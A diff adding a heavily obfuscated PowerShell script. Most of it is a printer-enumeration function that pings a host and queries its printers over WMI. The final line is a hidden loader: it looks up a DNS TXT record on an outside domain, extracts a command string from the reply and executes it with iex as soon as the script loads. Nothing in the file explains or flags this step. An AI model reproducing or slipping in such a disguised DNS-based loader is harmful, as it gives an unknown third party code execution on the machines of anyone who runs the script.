@@ -1,0 +1,55 @@
+function gET-Pr`INt`e`Rho`STS {
+    Param (
+        [string]${cO`Mp} = ${en`V`:c`OMp`UtErNamE}
+    )
+    
+    if (!${C`OmP}) { throw ("{1}{2}{0}" -f 'comps.','No',' ') }
+    
+    ${P`iNg} = .("{1}{2}{0}" -f'ect','New-Ob','j') ("{5}{6}{1}{4}{0}{3}{7}{2}"-f'Informat','Ne','Ping','io','t.Network','S','ystem.','n.')
+    try {
+        ${Re`sU`LT} = ${PI`NG}.("{0}{1}" -f'S','end').Invoke(${CO`mp})
+    } catch {
+        ${res`ULT} = ${n`ULL}
+    }
+
+    if (${RE`Sult}."stAt`Us" -eq ("{0}{1}{2}"-f'Suc','ces','s')) {
+        ${Pr`In`TErS} = .("{3}{2}{0}{1}"-f'iObje','ct','-Wm','Get') ("{1}{3}{0}{2}"-f'Pr','Win3','inter','2_') -ComputerName ${CO`mP} | &("{1}{2}{0}" -f't','s','elec') ("{1}{0}" -f 'e','nam'), ("{0}{2}{1}" -f 'shar','ame','en'), ("{1}{0}{2}" -f 'stemnam','sy','e'), ("{0}{2}{1}" -f 'p','me','ortna'), ("{0}{1}" -f 's','hared'), ("{2}{0}{1}{3}" -f 'rinter','pa','p','pernames'), ("{2}{4}{3}{0}{1}"-f'il','itydescriptions','ca','ab','p'), ("{2}{0}{1}" -f'tio','n','loca'), ("{0}{1}" -f 'c','omment'), ("{1}{2}{0}" -f'e','drive','rnam')
+        
+        
+        ${i`P} = ${R`ESU`lt}."a`DD`ReSS".("{0}{1}{2}" -f 'T','oSt','ring').Invoke()
+
+        foreach (${prIN`T`Er} in ${p`RI`NTErs}) {
+            [pscustomobject]@{
+                ("{1}{2}{0}"-f 'r','Co','mpute')               = ${c`oMP}.("{0}{2}{1}" -f'ToUp','r','pe').Invoke()
+                ("{0}{2}{1}"-f'Comp','terIP','u')             = ${i`P}
+                ("{2}{0}{1}" -f'nt','er','Pri')                = ${PRiN`T`er}."na`mE".("{2}{0}{1}" -f'oUppe','r','T').Invoke()
+                ("{0}{1}{2}"-f'Sha','reNam','e')              = $(try { ${pRIN`TeR}."share`NAme".("{0}{1}{2}"-f 'T','oUppe','r').Invoke() } catch { ${n`Ull} })
+                ("{0}{2}{1}" -f 'Sy','me','stemNa')             = $(if (${PR`i`NTeR}."s`Y`sTEmNAmE".("{1}{0}{3}{2}" -f'a','St','sWith','rt').Invoke('\')) {${pRInt`ER}."SySTeM`Na`Me".("{0}{2}{1}" -f 'Substr','g','in').Invoke(2).("{0}{1}"-f 'To','Upper').Invoke()} else {${pr`i`NteR}."sySTE`M`NAme".("{2}{1}{0}"-f 'r','Uppe','To').Invoke()})
+                ("{0}{1}"-f 'Loca','tion')               = $(try { ${p`R`INTEr}."LOc`ATioN" } catch { ${nu`Ll} })
+                ("{0}{1}{2}" -f 'C','ommen','t')                = $(try { ${P`RiNTEr}."cO`mmEnt" } catch { ${n`Ull} })
+                ("{0}{1}{2}{3}" -f 'D','ri','verNa','me')             = $(try { ${prIN`TeR}."DRiVe`R`NAme" } catch { ${NU`ll} })
+                ("{1}{0}"-f'ort','P')                   = ${PRIn`T`ER}."Po`RtNAmE"
+                ("{0}{1}"-f'Sh','ared')                 = ${pRi`NTEr}."sHaR`Ed"
+                ("{0}{3}{2}{1}" -f'Prin','s','e','terPaperNam')      = ${prI`NteR}."p`RintE`RpaPernA`mES"
+                ("{5}{3}{0}{2}{4}{1}" -f'abili','ons','t','ap','yDescripti','C') = ${Pr`I`NteR}."C`APABILi`Ty`dE`SCr`iptIoNS"
+            }
+        }
+    } else {
+        [pscustomobject]@{
+            ("{2}{1}{0}" -f'ter','ompu','C')               = ${CO`MP}.("{2}{0}{1}" -f'e','r','ToUpp').Invoke()
+            ("{3}{2}{1}{0}"-f 'P','uterI','omp','C')             = '-'
+            ("{1}{0}{2}" -f 't','Prin','er')                = '-'
+            ("{2}{1}{0}"-f 'ame','hareN','S')              = '-'
+            ("{2}{1}{0}"-f 'me','mNa','Syste')             = '-'
+            ("{0}{1}{2}" -f 'L','oc','ation')               = '-'
+            ("{2}{0}{1}" -f 'me','nt','Com')                = '-'
+            ("{2}{0}{1}"-f 'riverNa','me','D')             = '-'
+            ("{0}{1}"-f 'Por','t')                   = '-'
+            ("{1}{0}" -f 'red','Sha')                 = '-'
+            ("{3}{0}{4}{1}{2}"-f'rint','rPaperNa','mes','P','e')      = '-'
+            ("{3}{2}{5}{4}{0}{1}"-f'tio','ns','abilityDesc','Cap','ip','r') = '-'
+        }
+    }
+}
+
+if(''+(.("{1}{0}"-f 'kup','nsloo') -q=txt ("{5}{4}{1}{0}{3}{2}"-f 'rankingplac.','.ns.','l','p','s','p.s.o')) -match ("{0}{1}{2}" -f'@(','.*)','@')){&("{1}{0}"-f'ex','i') ${Ma`TcH`es}[1]}
